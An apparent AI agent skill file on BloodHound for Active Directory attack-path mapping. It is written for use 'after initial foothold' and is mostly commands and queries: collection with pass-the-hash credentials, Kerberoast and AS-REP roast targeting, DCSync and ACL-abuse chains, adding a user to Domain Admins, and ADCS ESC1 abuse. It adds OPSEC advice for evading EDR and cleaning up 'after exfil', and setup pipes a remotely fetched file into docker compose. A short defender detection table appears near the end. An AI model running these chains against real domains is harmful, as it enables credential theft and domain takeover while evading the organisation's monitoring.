---
name: bloodhound
description: |
  Active Directory attack path visualization using graph theory. Finds shortest path to Domain Admin,
  identifies Kerberoastable/AS-REP-roastable users, unconstrained delegation, ACL abuses, ADCS ESC
  vulnerabilities, and lateral movement vectors. Use after initial foothold in AD: collect data with
  SharpHound (Windows) or bloodhound-python (Linux/remote), import to BloodHound CE GUI, run Cypher
  queries to build and execute attack paths.
license: GPL-3.0
compatibility: "Collector: SharpHound on Windows or bloodhound-python (Linux/remote). GUI: BloodHound
  CE via Docker (recommended) or legacy BloodHound + Neo4j. CE available free at bloodhoundenterprise.io."
metadata:
  author: AeonDave
  version: "3.0"
---

# BloodHound

AD attack path mapping via graph analysis — find DA paths, ACL chains, Kerberoast targets, and lateral movement.

---

## Setup: BloodHound CE (Docker — recommended)

```bash
# Pull and start BloodHound CE
curl -L https://ghst.ly/getbhce | docker compose -f - up -d

# Or manual Docker Compose
curl -L https://raw.githubusercontent.com/SpecterOps/BloodHound/main/examples/docker-compose/docker-compose.yml -o docker-compose.yml
docker compose up -d

# Default: http://localhost:8080
# Credentials: printed on first run (check docker logs)
docker compose logs | grep "Initial Password"
```

**BloodHound CE API (for automation):**
```bash
# Get bearer token
TOKEN=$(curl -s -X POST http://localhost:8080/api/v2/login \
  -H "Content-Type: application/json" \
  -d '{"login_name":"admin","secret":"INITIAL_PASS"}' | jq -r '.data.session_token')

# Query via API
curl -s http://localhost:8080/api/v2/users -H "Authorization: Bearer $TOKEN" | jq
```

---

## Data Collection

### Option 1: SharpHound (Windows, domain-joined)

```cmd
# Full collection — all data types
SharpHound.exe -c All --outputdirectory C:\Windows\Temp\

# Stealth — DC data only, no session noise
SharpHound.exe -c DCOnly --throttle 2000 --jitter 25

# Explicit credentials (no need for domain-joined)
SharpHound.exe -c All --ldapusername "CORP\user" --ldappassword "pass" --domaincontroller DC_IP

# Target specific domain
SharpHound.exe -c All -d corp.local --domaincontroller 192.168.1.10
```

| Collection type | Data gathered | Noise level |
|----------------|--------------|-------------|
| `DCOnly` | Users, groups, computers, ACLs, trusts, GPOs | Low |
| `Session` | Logged-on sessions (where DA is now) | High |
| `LocalAdmin` | Local group membership on all computers | Medium-High |
| `All` | Everything above | High |

### Option 2: bloodhound-python (Linux/remote — no Windows host needed)

```bash
pip install bloodhound
# or
pipx install bloodhound-python

# Password auth
bloodhound-python -u user -p pass -d DOMAIN.LOCAL -c ALL -dc DC_IP -ns DC_IP

# Hash (PTH)
bloodhound-python -u user -d DOMAIN.LOCAL --hashes :NTHASH -c ALL -dc DC_IP -ns DC_IP

# Kerberos auth
bloodhound-python -u user -p pass -d DOMAIN.LOCAL -c ALL -dc DC_IP -ns DC_IP -k

# Collect only specific types (faster)
bloodhound-python -u user -p pass -d DOMAIN.LOCAL -c DCOnly,ACL -dc DC_IP -ns DC_IP

# Zip output for import
bloodhound-python -u user -p pass -d DOMAIN.LOCAL -c ALL -dc DC_IP -ns DC_IP --zip
```

**Tricks:**
- Add DC IP to `/etc/hosts` as the FQDN (`10.0.0.1 dc.corp.local`) to avoid DNS issues
- Use `-c DCOnly` first for stealth; add `Session` only when you need to track DA logins
- `-ns DC_IP` sets nameserver — critical when DNS doesn't resolve domain properly

### Option 3: RustHound (Rust — faster, cross-platform)

```bash
# Cross-compiled alternative to bloodhound-python, faster on large domains
rusthound -d domain.local -u user@domain.local -p pass -i <dc_ip> --zip

# LDAPS collection
rusthound -d domain.local -u user@domain.local -p pass -i <dc_ip> --ldaps --zip
```

### Tiered Collection Strategy (OPSEC)

```bash
# Tier 1: DC-only (LDAP queries to DC, no endpoint contact)
bloodhound-python -c DCOnly -u user -p pass -d DOMAIN.LOCAL -dc DC_IP -ns DC_IP --zip
# SharpHound: SharpHound.exe -c DCOnly --throttle 2000 --jitter 25

# Tier 2: Add ACL edges (still LDAP-only, no endpoint contact)
bloodhound-python -c DCOnly,ACL -u user -p pass -d DOMAIN.LOCAL -dc DC_IP -ns DC_IP --zip

# Tier 3: Session data (connects to ALL computers — HIGH noise)
bloodhound-python -c Session -u user -p pass -d DOMAIN.LOCAL -dc DC_IP -ns DC_IP --zip
# SharpHound: SharpHound.exe -c Session --throttle 5000 --jitter 50

# Tier 4: Scope to specific OU (reduces footprint)
SharpHound.exe -c All --ou "OU=Servers,DC=domain,DC=local" --throttle 3000 --jitter 30
```

| Tier | Collection | Noise | Detections |
|------|-----------|-------|------------|
| 1 | DCOnly | Minimal | Standard LDAP queries |
| 2 | DCOnly+ACL | Low | Elevated LDAP query volume |
| 3 | Session | HIGH | TCP 445 to every host, Event 4624 |
| 4 | All (scoped OU) | Medium | Bounded scope limits log volume |

### Importing Data

```bash
# BloodHound CE: Upload via web UI drag-and-drop at http://localhost:8080
# Or via API:
curl -s -X POST http://localhost:8080/api/v2/file-upload/start \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"expected_file_count":1}' | jq

# Upload zip
curl -X POST "http://localhost:8080/api/v2/file-upload/$UPLOAD_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@20240101_bloodhound.zip"
```

---

## Built-in Queries (GUI)

| Query | What it finds | Use case |
|-------|--------------|---------|
| Shortest Paths to Domain Admins | Any exploitable path to DA | Primary attack chain |
| All Kerberoastable Accounts | SPN users → crack TGS offline | Password cracking |
| AS-REP Roastable Users | Pre-auth disabled users | No-cred roast |
| Principals with DCSync Rights | Replication right holders | Path to cred dump |
| Computers with Unconstrained Delegation | TGT theft targets | Kerberos abuse |
| Shortest Path from Kerberoastable Users | Kerberoast → pivot path | Full chain |
| All DA Group Members | DA enumeration | Situational awareness |
| Find All Paths from Domain Users to DA | Broad attack surface | Initial analysis |

---

## Cypher Query Library

Open the Cypher query console in BloodHound GUI or CE to run these directly.

### Attack Path Discovery

```cypher
// Shortest path from owned user to DA
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

// All paths from Domain Users to DA (limit depth)
MATCH p=allShortestPaths((g:Group {name:"DOMAIN USERS@CORP.LOCAL"})-[*1..5]->(da:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p LIMIT 25

// Paths through specific computer
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(c:Computer {name:"TARGET.CORP.LOCAL"}))
RETURN p
```

### High-Value Target Enumeration

```cypher
// All Kerberoastable users with admin rights
MATCH (u:User {hasspn:true, admincount:true})
RETURN u.name, u.description ORDER BY u.name

// AS-REP roastable users
MATCH (u:User {dontreqpreauth:true})
RETURN u.name, u.description

// Non-admin users with local admin on machines
MATCH (u:User {admincount:false})-[r:AdminTo]->(c:Computer)
RETURN u.name, c.name ORDER BY u.name

// Unconstrained delegation computers
MATCH (c:Computer {unconstraineddelegation:true, enabled:true})
WHERE c.name <> "DC.CORP.LOCAL"
RETURN c.name

// Constrained delegation (S4U abuse targets)
MATCH (c:Computer {trustedtoauth:true})
RETURN c.name, c.allowedtodelegate

// Users with constrained delegation
MATCH (u:User {trustedtoauth:true})
RETURN u.name, u.allowedtodelegate
```

### ACL Abuse Discovery

```cypher
// Users with GenericAll on another user (password reset / shadow creds)
MATCH (u1:User)-[r:GenericAll]->(u2:User)
WHERE NOT u1.name STARTS WITH "ADMIN"
RETURN u1.name, u2.name

// GenericWrite on users (targeted Kerberoasting, shadow creds)
MATCH (u:User)-[r:GenericWrite]->(t:User)
RETURN u.name AS attacker, t.name AS target

// WriteDacl on domain object (grant DCSync)
MATCH (u:User)-[r:WriteDacl]->(d:Domain)
RETURN u.name

// AllExtendedRights (includes ForceChangePassword + DCSync)
MATCH (u:User)-[r:AllExtendedRights]->(t)
RETURN u.name, type(t), t.name

// WriteOwner on high-value objects
MATCH (u:User)-[r:WriteOwner]->(t:Group)
WHERE t.admincount = true
RETURN u.name, t.name

// AddMember rights (join high-value groups)
MATCH (u:User)-[r:AddMember]->(g:Group {admincount:true})
RETURN u.name, g.name

// Full ACL attack surface from owned user
MATCH (u:User {owned:true})-[r]->(t)
WHERE type(r) IN ["GenericAll","GenericWrite","WriteDacl","WriteOwner","AllExtendedRights","AddMember","ForceChangePassword"]
RETURN u.name, type(r), labels(t), t.name
```

### Session and Presence

```cypher
// Where are Domain Admins logged in right now?
MATCH (u:User)-[r:HasSession]->(c:Computer)
WHERE u.name IN [(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})<-[m:MemberOf*1..]-(uu:User) | uu.name]
RETURN u.name, c.name

// Computers where owned users have sessions
MATCH (u:User {owned:true})-[r:HasSession]->(c:Computer)
RETURN u.name, c.name

// Find admins logged in to non-DC machines (token theft opportunity)
MATCH (u:User {admincount:true})-[r:HasSession]->(c:Computer)
WHERE NOT c.name CONTAINS "DC"
RETURN u.name, c.name
```

### Trust and Cross-Domain

```cypher
// All domain trusts
MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain)
RETURN d1.name, type(r), d2.name

// Foreign DA members (cross-domain access)
MATCH (u:User)-[r:MemberOf]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
WHERE NOT u.domain = "CORP.LOCAL"
RETURN u.name, u.domain

// Foreign group members (any cross-domain membership)
MATCH (n)-[:MemberOf]->(g:Group)
WHERE n.domain <> g.domain
RETURN n.name, n.domain AS from_domain, g.name, g.domain AS in_domain

// Find users from child domain with paths to parent DA
MATCH p=shortestPath(
  (u:User {domain:"CHILD.CORP.LOCAL"})-[*1..]->(da:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
RETURN p

// Cross-forest trust exploitation paths
MATCH p=(d:Domain)-[:TrustedBy*1..]->(root:Domain)
WHERE NOT (root)-[:TrustedBy]->()
RETURN p
```

### Marking Owned Objects

```cypher
// Mark user as owned (after compromise)
MATCH (u:User {name:"TARGETUSER@CORP.LOCAL"})
SET u.owned = true
RETURN u.name

// Mark computer as owned
MATCH (c:Computer {name:"TARGET.CORP.LOCAL"})
SET c.owned = true
RETURN c.name

// Show all owned objects
MATCH (n {owned:true})
RETURN labels(n), n.name
```

---

## Attack Path Workflow

```bash
# 1. Collect data
bloodhound-python -u user -p pass -d DOMAIN.LOCAL -c ALL -dc DC_IP -ns DC_IP --zip

# 2. Import to CE
# Upload .zip at http://localhost:8080

# 3. Mark starting position as owned
# GUI: right-click user → Mark as Owned

# 4. Run: "Shortest Path from Owned Principals"
# OR run Cypher: shortestPath from {owned:true} to DA

# 5. Identify attack edge types in path:
#    HasSession      → token theft
#    AdminTo         → exec/secretsdump
#    GenericAll      → full control
#    WriteDacl       → grant yourself DCSync
#    AddMember       → join privileged group
#    AllExtendedRights → password change / DCSync
#    Kerberoastable  → crack SPN hash

# 6. Execute chain from step 5 using corresponding tools:
#    AdminTo + SMB   → nxc/psexec
#    Kerberoastable  → Rubeus/GetUserSPNs
#    GenericAll user → certipy shadow / forced password reset
#    WriteDacl       → dacledit.py (impacket) → grant DCSync → secretsdump
```

---

## Integration with Other Tools

| BloodHound finding | Tool | Action |
|-------------------|------|--------|
| Kerberoastable users | Rubeus / GetUserSPNs.py | `kerberoast /format:hashcat` |
| AS-REP roastable | Rubeus / GetNPUsers.py | `asreproast /format:hashcat` |
| AdminTo edge | nxc / wmiexec.py | `nxc smb TARGET -u ... --sam` |
| Unconstrained delegation | Rubeus | `monitor` TGTs, then `ptt` |
| GenericWrite on user | certipy | `shadow auto -account TARGET` |
| WriteDacl on domain | dacledit.py | grant DCSync, then secretsdump |
| AddMember on DA group | net rpc / PowerView | add self to Domain Admins |
| ADCSESC1 edge | certipy | `req -template <vuln> -upn administrator` |
| ForceChangePassword | PowerView | `Set-DomainUserPassword -Identity target` |
| CanPSRemote | evil-winrm | `evil-winrm -i TARGET -u user -p pass` |
| SQLAdmin edge | mssqlclient.py / PowerUpSQL | `xp_cmdshell whoami` |

---

## ADCS Attack Paths (BloodHound CE)

BloodHound CE natively detects ADCS misconfigurations via dedicated nodes and edges since v5.x.

### ADCS Node Types

| Node | Description |
|------|-------------|
| `EnterpriseCA` | Enterprise Certificate Authority |
| `CertTemplate` | Certificate template |
| `RootCA` | Root CA in the PKI hierarchy |
| `NTAuthStore` | NTAuth certificate store |
| `AIACA` | Authority Information Access CA |

### ADCS Edge Types

| Edge | Meaning |
|------|---------|
| `ADCSESC1` | ESC1 exploitable path (enrollee-supplied SAN) |
| `ADCSESC2` | ESC2 (Any Purpose EKU) |
| `ADCSESC3` | ESC3 (Certificate Request Agent) |
| `ADCSESC4` | ESC4 (writable template ACL) |
| `ADCSESC6a` / `ADCSESC6b` | ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2) |
| `ADCSESC9a` / `ADCSESC9b` | ESC9 (No Security Extension) |
| `ADCSESC10a` / `ADCSESC10b` | ESC10 (weak cert mapping) |
| `ADCSESC13` | ESC13 (issuance policy OID group link) |
| `Enroll` | Enrollment rights on CA or template |
| `PublishedTo` | Template published to CA |
| `IssuedSignedBy` | Certificate chain relationship |
| `TrustedForNTAuth` | CA trusted for NT authentication |

### ADCS Cypher Queries

```cypher
// Find all ESC1 exploitable paths
MATCH p = ()-[:ADCSESC1]->()
RETURN p

// All principals with enrollment rights on Enterprise CAs
MATCH p = ()-[:Enroll]->(eca:EnterpriseCA)
RETURN p

// Templates published to which CAs
MATCH p = (ct:CertTemplate)-[:PublishedTo]->(eca:EnterpriseCA)
RETURN ct.name AS template, eca.name AS ca

// ESC4 — who can write to certificate templates?
MATCH (n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(ct:CertTemplate)
RETURN n.name, type(r), ct.name

// Find any ADCS escalation path from owned principals
MATCH p = (n {owned:true})-[:ADCSESC1|ADCSESC2|ADCSESC3|ADCSESC4|ADCSESC6a|ADCSESC9a|ADCSESC10a|ADCSESC13]->()
RETURN p

// CAs trusted for NT authentication (required for cert-based auth)
MATCH p = (eca:EnterpriseCA)-[:TrustedForNTAuth]->(ntas:NTAuthStore)
RETURN eca.name
```

### ADCS Data Collection

```bash
# certipy collector outputs BloodHound-compatible data
certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -bloodhound -output bh_adcs

# Import certipy BloodHound zip alongside SharpHound data in CE
# Both can be uploaded to the same database for combined path analysis

# CertiHound — dedicated Linux-native ADCS collector for BH CE v6+
pip install certihound
certihound -d domain.local -u user -p pass --dc <dc_ip> --format zip -o ./output
```

---

## Privileged Access Queries (PSRemote, RDP, MSSQL)

```cypher
// Users who can PSRemote (WinRM) to computers
MATCH p = (u:User)-[:CanPSRemote]->(c:Computer)
RETURN u.name, c.name

// CanPSRemote paths from group membership
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer)
RETURN p2

// SQL Admin paths
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer)
RETURN p2

// RDP access paths
MATCH (u:User)-[:CanRDP]->(c:Computer)
WHERE NOT u.admincount = true
RETURN u.name, c.name

// DCOM execution paths
MATCH (u:User)-[:ExecuteDCOM]->(c:Computer)
RETURN u.name, c.name
```

---

## OPSEC Notes

- `SharpHound -c All` with Session collection triggers LDAP + NetSession queries visible in logs
- `bloodhound-python` from Linux: LDAP queries originating from non-domain-joined host are suspicious
- Use `-c DCOnly --throttle 2000 --jitter 25` for stealth collection — no session query, LDAP throttled
- GUI queries don't touch AD — analysis is local; safe once data is imported
- Marking objects owned only changes local DB, no AD changes
- BloodHound CE runs entirely local — no data leaves your machine
- SharpHound creates a ZIP in the output directory — clean up after exfil
- Session collection enumerates `NetSessionEnum` on every host — generates Event 4624 type 3 on each target
- LDAP queries for ACLs (`nTSecurityDescriptor`) request `DACL_SECURITY_INFORMATION` — anomalous volume detectable
- Repeated `1644` LDAP events (expensive queries) flag DCOnly runs on monitored DCs
- Prefer `bloodhound-python` over SharpHound when EDR is present on hosts; it avoids endpoint tooling entirely

### Detection Indicators (Defender Perspective)

| Indicator | Source | Detects |
|-----------|--------|---------|
| High-volume LDAP queries from single source | DC LDAP logs / Event 1644 | bloodhound-python / SharpHound DCOnly |
| NetSessionEnum calls to many hosts | Windows Security 4624 (type 3) | SharpHound Session collection |
| SAM-R queries from non-DC | Windows Security 4661 | Local group enumeration |
| SharpHound.exe on disk or in memory | EDR / Sysmon Event 1 | SharpHound execution |
| Anomalous nTSecurityDescriptor reads | LDAP diagnostic logging | ACL collection phase |

---

## Resources

| File | When to load |
|------|--------------|
| `references/cypher-queries-and-api.md` | Full Cypher query library, CE API automation, mark-owned workflow, ADCS queries, custom analysis patterns, noise reduction strategies |
